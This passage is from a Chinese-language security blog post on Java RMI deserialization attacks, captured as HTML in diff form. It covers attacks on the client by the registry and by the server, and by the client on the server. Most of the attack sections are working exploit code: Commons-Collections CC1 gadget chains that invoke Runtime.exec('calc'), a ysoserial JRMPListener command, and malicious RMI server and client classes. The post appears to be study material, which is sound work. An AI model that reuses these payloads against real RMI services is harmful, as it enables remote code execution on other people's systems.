class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span>  <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h3><h4 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h4><p><code>unbind</code>和<code>rebind</code>返回数据给客户端的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;calc&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        registry.list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h4><h5 id="服务端返回Object对象"><a href="#服务端返回Object对象" class="headerlink" title="服务端返回Object对象"></a>服务端返回Object对象</h5><p>在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。这里以CC1为例：</p>
+<p>User接口，返回的是Object对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>服务端实现 User 接口，返回 CC1 的恶意 Object 对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerReturnObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">User</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServerReturnObject</span><span class="params">(String name, <span class="type">int</span> age)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>服务端将恶意对象绑定到注册中心</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClassServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">liming</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerReturnObject</span>(<span class="string">&quot;liming&quot;</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;user&quot;</span>,liming);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>客户端获取对象并调用 <code>getUser()</code> 方法，将反序列化服务端传来的恶意远程对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) registry.lookup(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240319215932536.png" alt="image-20240319215932536"></p>
+<h5 id="加载远程对象"><a href="#加载远程对象" class="headerlink" title="加载远程对象"></a>加载远程对象</h5><p>这个就是 P神 写的那个，codebase 这种。这个可用性还是不咋样，我个人觉得本身这个注册中心，或者是服务端打出来，就没啥意义；再加上利用条件苛刻，就更没劲了。</p>
+<p>当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。</p>
+<p><strong>java.rmi.server.codebase：</strong>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p>
+<p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的class文件可以使用<code>http://</code>、<code>ftp://</code>、file:&#x2F;&#x2F;进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些<strong>子类</strong>中被重写的方法，客户端就需要从服务端提供的<code>java.rmi.server.codebase</code>URL去加载类；对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的子类，那么服务端需要从客户端提供的<code>java.rmi.server.codebase</code>URL去加载对应的类。客户端与服务端两边的<code>java.rmi.server.codebase</code>URL都是互相传递的。无论是客户端还是服务端要远程加载类，都需要满足以下条件：</p>
+<ol>
+<li>由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置<code>java.security.policy</code>，这在后面的利用中可以看到。</li>
+<li>属性 <code>java.rmi.server.useCodebaseOnly</code> 的值必需为false。但是从JDK 6u45、7u21开始，<code>java.rmi.server.useCodebaseOnly</code> 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的<code>java.rmi.server.codebase</code> 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>
+</ol>
+<p>总的来说利用条件十分苛刻，可用性不强。</p>
+<h3 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h3><h4 id="客户端打服务端"><a href="#客户端打服务端" class="headerlink" title="客户端打服务端"></a>客户端打服务端</h4><ul>
+<li>jdk版本1.7</li>
+<li>使用具有漏洞的Commons-Collections3.1组件</li>
+<li>RMI提供的数据有Object类型（攻击payload就是Object类型）</li>
+</ul>
+<p>服务端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VictimServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evil</span><span class="params">(Object obj)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">evil</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;调用了evil方法，传递对象为：&quot;</span> + obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">VictimServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>客户端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        VictimServer.<span class="type">RemoteObj</span> <span class="variable">r</span> <span class="operator">=</span> (VictimServer.RemoteObj) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>);</span><br><span class="line">        r.evil(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;lala&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="远程加载对象"><a href="#远程加载对象" class="headerlink" title="远程加载对象"></a>远程加载对象</h4><p>和上边Server打Client一样利用条件非常苛刻</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1091/#serverrmi">https://paper.seebug.org/1091/#serverrmi</a></p>
+
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/03/27/java/JNDI/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/02/20/python/Python Prototype Pollution/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-03-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Java/">Java<span>12</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/RMI/">RMI<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#RMI"><span class="toc-article-text">RMI</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-article-text">概述</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-article-text">攻击注册中心</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#list"><span class="toc-article-text">list</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#bind-%E6%88%96-rebind"><span class="toc-article-text">bind 或 rebind</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#lookup-%E6%88%96-unbind"><span class="toc-article-text">lookup 或 unbind</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-article-text">攻击客户端</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-article-text">注册中心攻击客户端</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-article-text">服务端攻击客户端</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%94%E5%9B%9EObject%E5%AF%B9%E8%B1%A1"><span class="toc-article-text">服务端返回Object对象</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-article-text">加载远程对象</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-article-text">攻击服务端</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%89%93%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-article-text">客户端打服务端</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%AF%B9%E8%B1%A1"><span class="toc-article-text">远程加载对象</span></a></li></ol></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
